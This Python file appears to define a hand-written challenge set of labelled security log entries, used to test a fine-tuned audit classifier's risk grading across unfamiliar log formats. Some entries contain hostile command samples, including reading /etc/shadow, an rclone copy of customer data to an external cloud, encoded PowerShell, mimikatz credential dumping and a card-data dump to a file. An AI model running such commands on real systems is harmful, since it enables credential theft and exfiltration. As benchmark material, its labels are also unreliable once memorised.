"""
challenge_set.py
----------------
A HAND-WRITTEN generalization test for the fine-tuned audit classifier.

None of these logs come from audit_dataset.py's generator. They deliberately use
formats it never emitted (CEF, AWS CloudTrail, Okta, Kubernetes audit, Windows
EVTX-rendered, Cisco ASA, auditd, Suricata, GraphQL, Sysmon) AND, more importantly,
semantic patterns that probe whether the model *reasons* or just template-matches.

`novelty_type`:
    format_novel  - same idea as training, unfamiliar log format
    semantic_novel- reasoning the model must do on genuinely new content
    fp_trap       - looks dangerous (scary keywords/tables/sizes) but is authorized
                    or benign; the model must NOT over-trigger
    adversarial   - a real high-severity event disguised in unusual phrasing/format
    judgment_call - reasonable auditors could disagree; label is my defensible best

Labels follow the same taxonomy as Session 1's system prompt. `rationale` records
why, so error analysis is auditable. Any secrets are public placeholders (e.g. AWS's
documented AKIAIOSFODNN7EXAMPLE key) — nothing real.
"""

import pandas as pd

# each row: (raw_log, risk_level, policy_violation, unauthorized_pii_access,
#            category, novelty_type, difficulty, rationale)
CHALLENGE = [
    # -------------------- LOW: benign in novel formats --------------------
    ('{"eventVersion":"1.08","eventName":"ConsoleLogin","userIdentity":{"type":"IAMUser","userName":"jsmith"},"additionalEventData":{"MFAUsed":"Yes"},"responseElements":{"ConsoleLogin":"Success"},"sourceIPAddress":"10.0.4.12"}',
     "Low", 0, 0, "auth", "format_novel", "easy",
     "Successful MFA console login by a normal user from an internal IP."),
    ("%ASA-6-113039: Group <VPN-Employees> User <awong> IP <10.0.7.88> AnyConnect session established during business hours",
     "Low", 0, 0, "auth", "format_novel", "easy",
     "Routine authorized VPN connect, business hours, known user."),
    ('192.168.1.34 - - [12/Apr/2025:10:22:04 +0000] "GET /api/v2/health HTTP/2.0" 200 41 "-" "kube-probe/1.29"',
     "Low", 0, 0, "web", "format_novel", "easy",
     "Kubernetes liveness probe hitting a health endpoint; expected."),
    ('{"eventType":"user.session.start","actor":{"alternateId":"mpatel@corp.com"},"outcome":{"result":"SUCCESS"},"client":{"ipAddress":"10.0.9.41","device":"Computer"}}',
     "Low", 0, 0, "auth", "format_novel", "easy",
     "Normal Okta session start, success, internal device."),
    ('{"kind":"Event","verb":"get","user":{"username":"system:serviceaccount:shop:catalog-api"},"objectRef":{"resource":"configmaps","namespace":"shop","name":"catalog-cfg"},"responseStatus":{"code":200}}',
     "Low", 0, 0, "k8s", "format_novel", "med",
     "Service account reading a configmap in its own namespace; least-privilege normal op."),
    ('<Event><System><EventID>4624</EventID></System><EventData>Logon Type: 3  Account Name: kobrien  Source Network Address: 10.0.2.6  Elevated Token: No</EventData></Event>',
     "Low", 0, 0, "auth", "format_novel", "med",
     "Windows 4624 successful network logon, standard (non-elevated) token, internal source."),

    # -------------------- FP TRAPS: dangerous-looking but authorized --------------------
    ('{"svc":"vuln_scanner","account":"svc_nessus","event":"scan_started","targets_scanned":428,"ports_touched":6100,"authorized":true,"change_ticket":"CHG-4471","window":"approved_maintenance"}',
     "Low", 0, 0, "scan", "fp_trap", "hard",
     "Looks like a port scan (High in training) but it is an AUTHORIZED scanner account in an approved window."),
    ("2025-04-02T14:03:11 db_server postgres[418]: LOG: user=dbadmin role=DBA statement: SELECT * FROM hr_salary WHERE cycle='2025Q1' -- ticket=AUD-220 approved_by=CISO",
     "Low", 0, 0, "db", "fp_trap", "hard",
     "Sensitive table (hr_salary) but the actor is a DBA acting under an approved audit ticket: authorized, not a PII violation."),
    ('{"svc":"payroll_runner","principal":"svc_payroll","action":"db.read","table":"employee_ssn","rows":1200,"job":"biweekly_payroll","scheduled":true}',
     "Low", 0, 0, "db", "fp_trap", "hard",
     "Reads employee_ssn, but it is the payroll service account doing its scheduled job: legitimate role for the resource."),
    ("file_server dlp: user=svc_backup action=DOWNLOAD file=customer_pii_export.csv size=6200MB dest=10.0.2.9(backup-nas) classification=RESTRICTED policy=backup_whitelist action_taken=allowed",
     "Low", 0, 0, "exfil", "fp_trap", "hard",
     "Large RESTRICTED transfer (looks like exfil) but destination is the internal backup NAS under a whitelist policy."),
    ("<Event><System><EventID>4625</EventID></System><EventData>Account Name: rgarcia  Failure Reason: Bad password  Source Network Address: 10.0.4.12</EventData></Event> ... followed by 4624 success for rgarcia 8s later",
     "Low", 0, 0, "auth", "fp_trap", "med",
     "A single failed password then immediate success from the user's own workstation: fat-fingered password, not brute force."),
    ('{"svc":"secrets_mgr","principal":"svc_rotation","event":"key_rotated","key_id":"api-gw-signing","old_disabled":true,"new_enabled":true,"scheduled":true}',
     "Low", 0, 0, "secrets", "fp_trap", "med",
     "Automated scheduled key rotation (credential change) — benign, not a leak."),
    ("auditd: type=USER_CMD msg=audit(1712066400.1:842): cmd='cat /etc/shadow' acct='sec_admin' res=success terminal=pts/0 approved_change=INC-3320",
     "Medium", 0, 0, "priv", "fp_trap", "hard",
     "Reading /etc/shadow is sensitive, but sec_admin is authorized and it is tied to an incident ticket: notable/monitored, not a violation."),
    ('web_app ERROR: java.lang.NullPointerException at com.corp.cart.Checkout.total(Checkout.java:88)\n\tat com.corp.cart.Handler.run(Handler.java:41) -- no secrets in trace',
     "Low", 0, 0, "app", "fp_trap", "med",
     "Alarming-looking stack trace but it is a plain application NPE with no security content."),

    # -------------------- MEDIUM: soft anomalies, novel formats --------------------
    ("<Event><System><EventID>4625</EventID></System><EventData>Account Name: hkumar  Failure Reason: Unknown user name or bad password  Source Network Address: 198.51.100.7</EventData></Event>",
     "Medium", 0, 0, "auth", "format_novel", "easy",
     "One failed logon (Windows 4625) from an external IP; minor anomaly, not yet an attack pattern."),
    ("%ASA-6-113039: Group <VPN-Employees> User <lchen> IP <185.220.100.8> AnyConnect session established at 03:14 local (outside business hours)",
     "Medium", 1, 0, "auth", "semantic_novel", "med",
     "Successful auth but outside business hours from an unusual IP: soft policy issue / worth review."),
    ("haproxy[221]: WARNING backend api-gw server tls: peer certificate expired 3 days ago; connection downgraded to unverified",
     "Medium", 1, 0, "tls", "format_novel", "easy",
     "Expired certificate in use — a control/policy lapse, medium severity."),
    ('{"eventType":"user.mfa.factor.deactivate","actor":{"alternateId":"dmurphy@corp.com"},"target":{"alternateId":"dmurphy@corp.com"},"outcome":{"result":"SUCCESS"}}',
     "Medium", 1, 0, "auth", "semantic_novel", "med",
     "User disabled their own MFA — weakens a security control; soft violation warranting review."),
    ('{"eventType":"user.session.start","actor":{"alternateId":"pkoval@corp.com"},"outcome":{"result":"SUCCESS"},"security_context":{"is_new_country":true,"is_new_device":true}}',
     "Medium", 0, 0, "auth", "judgment_call", "hard",
     "New-country + new-device login could be travel or takeover; single event with no other signal -> Medium review call."),

    # -------------------- HIGH: probable attack, unconfirmed --------------------
    ("CEF:0|Cisco|ASA|9.1|338002|Multiple failed authentications|5|src=45.9.148.30 suser=root cnt=14 outcome=failure window=60s account_locked=false",
     "High", 1, 0, "auth", "format_novel", "med",
     "14 failed root auths from one external IP in 60s, no success yet: probable brute-force in progress."),
    ('{"event_type":"alert","alert":{"signature":"ET SCAN Suricata port sweep"},"src_ip":"91.202.4.55","dest_ports_hit":734,"authorized":false}',
     "High", 1, 0, "scan", "format_novel", "med",
     "Unauthorized external port sweep detected by Suricata: reconnaissance, probable attack."),
    ("auditd: type=USER_LOGIN msg=audit(1712066500.2:901): acct=\"contractor_x\" res=failed reason=account_expired addr=203.0.113.99",
     "High", 1, 0, "auth", "format_novel", "med",
     "Login attempt against an expired/disabled account from external IP: suspicious access attempt."),
    ('{"kind":"Event","verb":"list","user":{"username":"system:serviceaccount:dev:build-runner"},"objectRef":{"resource":"secrets","namespace":"kube-system"},"responseStatus":{"code":403,"reason":"Forbidden"}}',
     "High", 1, 0, "k8s", "semantic_novel", "hard",
     "A dev service account TRIED to list secrets in kube-system and was denied (403): privilege-misuse attempt, not a confirmed breach."),
    ('{"eventName":"AttachUserPolicy","userIdentity":{"userName":"sales_ortiz"},"requestParameters":{"policyArn":"arn:aws:iam::aws:policy/AdministratorAccess","userName":"sales_ortiz"},"errorCode":"AccessDenied"}',
     "High", 1, 0, "iam", "semantic_novel", "hard",
     "Self privilege-escalation ATTEMPT to admin, but AccessDenied: attempted, not achieved -> High not Critical."),
    ("<Event><System><EventID>1</EventID><Provider Name='Sysmon'/></System><EventData>Image: powershell.exe  CommandLine: powershell -nop -w hidden -enc SQBFAFgAKAA...  ParentImage: WINWORD.EXE</EventData></Event>",
     "High", 1, 0, "endpoint", "semantic_novel", "hard",
     "Encoded PowerShell spawned by Word — classic malicious pattern, but no confirmed compromise yet."),

    # -------------------- CRITICAL: confirmed breach, disguised --------------------
    ('{"eventType":"user.session.start","actor":{"alternateId":"jsmith@corp.com"},"client":{"ipAddress":"45.9.148.30"},"outcome":{"result":"SUCCESS"},"debugContext":{"debugData":{"failedAttemptsBefore":"41"}}}',
     "Critical", 1, 0, "auth", "adversarial", "hard",
     "Okta: 41 failures then a SUCCESS from the same external IP = confirmed brute-force success."),
    ('{"eventName":"GetObject","userIdentity":{"type":"IAMUser","userName":"intern_park"},"requestParameters":{"bucketName":"corp-hr","key":"payroll/ssns_2025.parquet"},"sourceIPAddress":"203.0.113.99"}',
     "Critical", 1, 1, "db", "adversarial", "hard",
     "An intern account pulling an HR SSN payroll object from an external IP: unauthorized PII access."),
    ('web_app graphql: principal=svc_webshop query="{ customers(first:50000){ fullName socialSecurityNumber dateOfBirth } }" returned_rows=50000',
     "Critical", 1, 1, "db", "adversarial", "hard",
     "A shop service account bulk-pulling SSNs via GraphQL: role has no business with this PII; mass unauthorized access."),
    ("cloudwatch app/api ERROR startup config dump: AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY logged in plaintext",
     "Critical", 1, 1, "secrets", "adversarial", "med",
     "Live-style AWS credentials exposed in plaintext logs: secret leakage / sensitive-material exposure."),
    ('{"eventName":"AttachUserPolicy","userIdentity":{"userName":"growth_bot"},"requestParameters":{"policyArn":"arn:aws:iam::aws:policy/AdministratorAccess","userName":"growth_bot"},"responseElements":null,"errorCode":null}',
     "Critical", 1, 0, "iam", "adversarial", "hard",
     "Same self-escalation to AdministratorAccess but with NO error = it SUCCEEDED: confirmed privilege escalation."),
    ('dlp: user=sales_ortiz cmd="rclone copy /mnt/exports/customers_full.csv mega:personal-backup" bytes=4100000000 dest=external.cloud classification=RESTRICTED',
     "Critical", 1, 1, "exfil", "adversarial", "hard",
     "Bulk RESTRICTED customer data pushed to a personal external cloud via rclone: confirmed exfiltration of PII."),
    ("<Event><System><EventID>1102</EventID></System><EventData>The audit log was cleared. Subject Account Name: growth_bot</EventData></Event>",
     "Critical", 1, 0, "endpoint", "adversarial", "hard",
     "Security audit log cleared by an unexpected account: anti-forensics, strong indicator of active compromise."),
    ("<Event><System><EventID>4732</EventID></System><EventData>A member was added to a security-enabled local group  Group: Domain Admins  Member: newsvc01  Subject: intern_cho  Time: 03:07</EventData></Event>",
     "Critical", 1, 0, "iam", "adversarial", "hard",
     "A new account added to Domain Admins by an intern account at 3am: unauthorized privilege escalation."),
    ("edr alert: process=lsass.exe access by mimikatz.exe technique=T1003 credential_dumping host=WKS-114 action=blocked_but_executed",
     "Critical", 1, 0, "endpoint", "semantic_novel", "med",
     "Mimikatz LSASS credential dumping detected: confirmed active attack tooling on an endpoint."),
    ("2025-04-05T02:55:00 db_server mysql: user=mktg_reed stmt: SELECT iban, card_number FROM bank_accounts INTO OUTFILE '/tmp/x.csv' -- 88211 rows",
     "Critical", 1, 1, "db", "semantic_novel", "med",
     "Marketing account dumping bank/card data to a file: unauthorized bulk PII/financial access + exfil staging."),

    # -------------------- robustness: truncation / messiness --------------------
    ("203.0.113.7 - - [12/Apr/2025:11:02:19 +0000] \"GET /static/app.js HTTP/1.1\" 200 118",
     "Low", 0, 0, "web", "format_novel", "easy",
     "Plain static asset fetch, 200 OK; benign even though format differs from training."),
    ('{"actor":"tnguyen","act":"login","res":"ok","ip":"10.0.11.3","ts":"2025-04-06T09:10:00"}  <-- reordered/renamed keys',
     "Low", 0, 0, "auth", "format_novel", "med",
     "Successful login with unusual/renamed JSON keys: benign, tests robustness to schema drift."),
    ("CEF:0|PaloAlto|PAN-OS|10.2|end|THREAT|8|src=45.133.1.14 spt=443 dst=10.0.4.12 act=alert cat=command-and-control app=dns-tunnel bytes_out=920000000",
     "Critical", 1, 0, "exfil", "judgment_call", "hard",
     "Large DNS-tunnel C2 traffic flagged: strong exfiltration indicator -> Critical (reasonable to argue High if unconfirmed)."),
    ("auditd: type=SYSCALL msg=audit(...): comm=\"sudo\" acct=\"tnguyen\" cmd=/usr/bin/systemctl-restart res=failed reason=user_not_in_sudoers",
     "Medium", 1, 0, "priv", "judgment_call", "med",
     "Non-privileged user failed a benign sudo command (not in sudoers): minor policy issue, low intent signal."),
]

COLUMNS = ["raw_log", "risk_level", "policy_violation", "unauthorized_pii_access",
           "category", "novelty_type", "difficulty", "rationale"]


def generate_challenge_set() -> pd.DataFrame:
    df = pd.DataFrame(CHALLENGE, columns=COLUMNS)
    df.insert(0, "challenge_id", range(1, len(df) + 1))
    return df


if __name__ == "__main__":
    df = generate_challenge_set()
    print(f"Total challenge rows: {len(df)}\n")
    print("risk_level:")
    print(df["risk_level"].value_counts(), "\n")
    print("novelty_type:")
    print(df["novelty_type"].value_counts(), "\n")
    print("policy_violation:", dict(df["policy_violation"].value_counts()))
    print("unauthorized_pii_access:", dict(df["unauthorized_pii_access"].value_counts()))
    df.to_csv("challenge_set.csv", index=False)
    print("\nSaved -> challenge_set.csv")
